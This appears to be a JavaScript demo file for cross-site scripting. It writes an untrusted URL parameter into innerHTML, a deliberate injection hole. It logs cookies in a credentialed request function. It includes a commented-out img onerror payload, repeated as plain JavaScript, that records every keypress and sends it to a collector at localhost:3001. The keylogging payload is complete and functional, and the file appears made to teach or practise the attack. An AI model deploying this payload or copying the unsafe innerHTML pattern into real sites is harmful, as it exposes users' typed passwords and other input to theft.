// Function to set a cookie, mostly this will be set from server
function setCookie(name, value, days) {
  const date = new Date();
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
  const expires = "expires=" + date.toUTCString();
  document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

// Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
setCookie("exampleCookie", "Hello, Cookie!", 7);

const params = new URLSearchParams(window.location.search);
const name = params.get("name");
document.getElementById("nameSpan").innerHTML = name;

function createPost(title, description) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/post", true);
  console.log(document.cookie);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send(`txtName=${title}&mtxMessage=${description}`);
}

// Injection Code
{
  /* <img
  src="does-not-exist"
  onerror='var timeout;
var buffer = "";
document.querySelector("body").addEventListener("keypress", (event) => {
  if (event.which !== 0) {
    clearTimeout(timeout);
    buffer += String.fromCharCode(event.which);
    timeout = setTimeout(() => {
      var xhr = new XMLHttpRequest();
      var uri = `http://localhost:3001/keys?data=` + encodeURIComponent(buffer);
      xhr.open("GET", uri);
      xhr.send();
      buffer = "";
    }, 400);
  }
});'
/> */
}

// JS PART
// var timeout;
// var buffer = "";
// document.querySelector("body").addEventListener("keypress", (event) => {
//   if (event.which !== 0) {
//     clearTimeout(timeout);
//     buffer += String.fromCharCode(event.which);
//     timeout = setTimeout(() => {
//       var xhr = new XMLHttpRequest();
//       var uri = `http://localhost:3001/keys?data=` + encodeURIComponent(buffer);
//       xhr.open("GET", uri);
//       xhr.send();
//       buffer = "";
//     }, 400);
//   }
// });
